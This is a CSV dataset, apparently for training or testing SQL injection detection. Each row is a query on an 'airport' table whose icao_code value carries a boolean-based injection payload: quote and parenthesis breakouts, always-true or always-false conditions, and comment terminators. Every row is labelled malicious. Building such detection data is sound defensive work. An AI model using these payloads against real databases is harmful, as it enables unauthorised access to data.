full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT * FROM airport WHERE icao_code = ""AGBT') AS ZCvJ WHERE 5464=5464 AND 1472=1472-- qITH"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"") AS nTxb WHERE 4670=4670 AND 6070=8933-- lMSj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"") AS pPCi WHERE 2513=2513 AND 1472=1472-- TDmR"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT""=""AGBT"" AND 6959=4617 AND ""AGBT""=""AGBT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT""=""AGBT"" AND 1472=1472 AND ""AGBT""=""AGBT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' IN BOOLEAN MODE) AND 1698=5651#"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' IN BOOLEAN MODE) AND 1472=1472#"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT) AND 6759=1532-- Qtfv"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT) AND 1472=1472-- WYDt"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT) AND 9080=4123 AND (4221=4221"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT) AND 1472=1472 AND (2963=2963"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT)) AND 6806=2225 AND ((9634=9634"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT)) AND 1472=1472 AND ((2853=2853"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT))) AND 5912=5975 AND (((2666=2666"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT))) AND 1472=1472 AND (((3163=3163"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT AND 1799=5693"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT AND 1472=1472"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT AND 1091=2131-- pwPx"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT AND 1472=1472-- qFeP"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT AND 3463=3666# ITmy"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT AND 1472=1472# mWwP"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT) WHERE 4107=4107 AND 6268=1544-- Znur"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT) WHERE 3596=3596 AND 1472=1472-- GsuK"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT WHERE 1080=1080 AND 3137=1251-- jjEY"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT WHERE 2381=2381 AND 1472=1472-- QdhY"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT+(SELECT FUHy WHERE 9639=9639 AND 9727=4933)+"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT+(SELECT FnJE WHERE 8436=8436 AND 1472=1472)+"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT)) AS wFFP WHERE 1068=1068 AND 8837=9745-- PpXW"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT)) AS Niuk WHERE 6503=6503 AND 1472=1472-- EsxH"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT) AS yypA WHERE 5695=5695 AND 3027=5765-- AfnD"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT) AS YIRO WHERE 9489=9489 AND 1472=1472-- AxDX"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT` WHERE 5390=5390 AND 2124=6777-- nIPi"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT` WHERE 5160=5160 AND 1472=1472-- EFiw"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT`) WHERE 6684=6684 AND 3091=1645-- Wehq"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT`) WHERE 5069=5069 AND 1472=1472-- bfix"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT`=`AGBT` AND 6173=6019 AND `AGBT`=`AGBT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT`=`AGBT` AND 1472=1472 AND `AGBT`=`AGBT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT]-(SELECT 0 WHERE 3067=3067 AND 5959=1000)|[AGBT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT]-(SELECT 0 WHERE 5411=5411 AND 1472=1472)|[AGBT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9334"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-5273') OR 1599=8962-- Ephv"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3038') OR 5415=5415-- Dqxj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7987' OR 4762=2899-- DctE"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-6415' OR 5415=5415-- qodN"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-1274"" OR 1624=1598-- DqwS"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7809"" OR 5415=5415-- zQoB"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7232"" OR 4353=2097-- btmB"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-8218"" cJONuolwJI-- ZaIT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2096') OR 5659=7068 AND ('Nfqw'='Nfqw"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4756') OR 5415=5415 AND ('Ljhx'='Ljhx"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-5754')) OR 1292=1753 AND (('Kjsp'='Kjsp"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-5745')) OR 5415=5415 AND (('EAnP'='EAnP"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-1529'))) OR 2363=4217 AND ((('YeSb'='YeSb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4579'))) OR 5415=5415 AND ((('jxhm'='jxhm"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3753' OR 1793=2178 AND 'VaDb'='VaDb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9670' OR 5415=5415 AND 'Tdhi'='Tdhi"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-5863') OR 5582=2178 AND ('onbf' LIKE 'onbf"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2740') OR 5415=5415 AND ('fLBR' LIKE 'fLBR"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9173')) OR 5197=7910 AND (('zCHG' LIKE 'zCHG"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-6958')) OR 5415=5415 AND (('nAXm' LIKE 'nAXm"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4264'))) OR 6260=4454 AND ((('tQij' LIKE 'tQij"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-1196'))) OR 5415=5415 AND ((('HwFF' LIKE 'HwFF"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4883%' OR 8536=4872 AND 'rXTu%'='rXTu"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3324%' OR 5415=5415 AND 'VAZJ%'='VAZJ"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3316' OR 1352=8822 AND 'qqro' LIKE 'qqro"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3971' OR 5415=5415 AND 'xJtf' LIKE 'xJtf"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-6160"") OR 9846=5103 AND (""gjrz""=""gjrz"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9711"") OR 5415=5415 AND (""IFQJ""=""IFQJ"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7936"")) OR 4686=2637 AND ((""dbFc""=""dbFc"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9625"")) OR 5415=5415 AND ((""IlZZ""=""IlZZ"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3068""))) OR 5058=6805 AND (((""jMZH""=""jMZH"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7602""))) OR 5415=5415 AND (((""IfHi""=""IfHi"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-1426"" OR 9365=2674 AND ""oNZF""=""oNZF"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7751"" OR 5415=5415 AND ""zwHY""=""zwHY"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7634"" OR 7769=8240 AND ""TXgi""=""TXgi"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-6796"" cJONuolwJI AND ""yIDj""=""yIDj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-8265"") OR 6893=4061 AND (""bYwZ"" LIKE ""bYwZ"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-5983"") OR 5415=5415 AND (""MdAI"" LIKE ""MdAI"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2112"")) OR 7154=8148 AND ((""VIey"" LIKE ""VIey"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9419"")) OR 5415=5415 AND ((""GvRn"" LIKE ""GvRn"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2646""))) OR 7181=7450 AND (((""Tput"" LIKE ""Tput"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3685""))) OR 5415=5415 AND (((""AzOy"" LIKE ""AzOy"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3511"" OR 8284=7529 AND ""TGpT"" LIKE ""TGpT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9312"" OR 5415=5415 AND ""SgdF"" LIKE ""SgdF"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2760"" OR 4771=2227 AND ""drMg"" LIKE ""drMg"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-1699"" cJONuolwJI AND ""xPFV"" LIKE ""xPFV"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9844' OR 4559=6017 OR 'hXOA'='zgSE"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-1115' OR 5415=5415 OR 'aEvL'='qTCf"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9981') WHERE 4111=4111 OR 8995=5479-- oqBI"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2573') WHERE 7152=7152 OR 5415=5415-- zUDM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7490"") WHERE 4649=4649 OR 8210=2246-- cWGZ"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-6106"") WHERE 5671=5671 OR 5415=5415-- OBmD"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2724' WHERE 3434=3434 OR 2679=6638-- oHYj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4527' WHERE 1680=1680 OR 5415=5415-- ldMR"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9019"" WHERE 9651=9651 OR 5864=6324-- DbMU"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-6291"" WHERE 3058=3058 OR 5415=5415-- BAfB"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4531')) AS IGrl WHERE 8357=8357 OR 7687=4327-- AjLh"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2494')) AS tVli WHERE 2983=2983 OR 5415=5415-- wKfC"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-6500"")) AS ysFJ WHERE 8593=8593 OR 2592=9562-- XZkY"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7292"")) AS JRtJ WHERE 3375=3375 OR 5415=5415-- atPS"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3912') AS eXAB WHERE 7852=7852 OR 6573=9967-- kAdI"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4025') AS huaE WHERE 9953=9953 OR 5415=5415-- QqTk"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3544"") AS rApy WHERE 4504=4504 OR 5521=4296-- Chzl"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7719"") AS qAHR WHERE 7705=7705 OR 5415=5415-- YGKy"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2110) OR 5517=9298-- lyTM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-1735) OR 5415=5415-- usVS"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4085) OR 2983=2185 AND (3506=3506"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-9755) OR 5415=5415 AND (6439=6439"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-1564)) OR 2702=8398 AND ((7152=7152"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7561)) OR 5415=5415 AND ((2387=2387"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2998))) OR 6097=7440 AND (((7328=7328"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4743))) OR 5415=5415 AND (((5637=5637"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4952 OR 9374=7669"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7725 OR 5415=5415"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4075 OR 9527=4900-- nIYx"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2452 OR 5415=5415-- rshX"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-5358 OR 3708=4513# KIDO"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4581 OR 5415=5415# XQQG"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3990) WHERE 6034=6034 OR 3618=3749-- OXuL"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-3844) WHERE 5869=5869 OR 5415=5415-- ybXl"";",1,airport-S1,Unknown,Unknown
